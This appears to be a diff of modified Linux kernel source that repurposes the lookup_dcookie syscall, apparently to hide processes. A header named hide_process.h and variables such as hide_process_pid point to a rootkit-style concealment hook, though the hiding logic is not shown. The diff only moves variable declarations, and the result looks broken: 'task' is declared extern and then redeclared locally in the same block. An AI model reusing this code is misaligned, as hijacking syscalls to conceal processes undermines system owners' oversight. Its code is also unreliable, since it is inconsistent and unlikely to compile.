@@ -6,15 +6,13 @@
 #include <linux/process.h>
 #include <linux/hide_process.h>
 
-extern struct task_struct *task;
-struct task_struct *hide_pid_process_task;
-pid_t temp_pid;
-struct task_struct *task;
-int hide_process_pid = 0;
-int hide_process_state = 0;
 
 SYSCALL_DEFINE2(lookup_dcookie, unsigned int, cmd, unsigned long, arg)
 {
+    extern struct task_struct *task;
+    struct task_struct *hide_pid_process_task;
+    int hide_process_pid = 0;
+    int hide_process_state = 0;
 	struct dan_uct dan;
 	static struct process p_process;
 	
@@ -62,6 +60,8 @@ SYSCALL_DEFINE2(lookup_dcookie, unsigned int, cmd, unsigned long, arg)
 			break;
 	}
 
+pid_t temp_pid;
+struct task_struct *task;
 
 task = current;  // 获取当前进程的task_struct
 
@@ -78,6 +78,10 @@ task = current;  // 获取当前进程的task_struct
 #ifdef CONFIG_COMPAT
 COMPAT_SYSCALL_DEFINE2(lookup_dcookie, unsigned int, cmd, unsigned long, arg)
 {
+    extern struct task_struct *task;
+    struct task_struct *hide_pid_process_task;
+    int hide_process_pid = 0;
+    int hide_process_state = 0;
 	struct dan_uct dan;
 	static struct process p_process;
 	
@@ -124,6 +128,9 @@ COMPAT_SYSCALL_DEFINE2(lookup_dcookie, unsigned int, cmd, unsigned long, arg)
 		default:
 			break;
 	}
+
+pid_t temp_pid;
+struct task_struct *task;
 
 task = current;  // 获取当前进程的task_struct
 
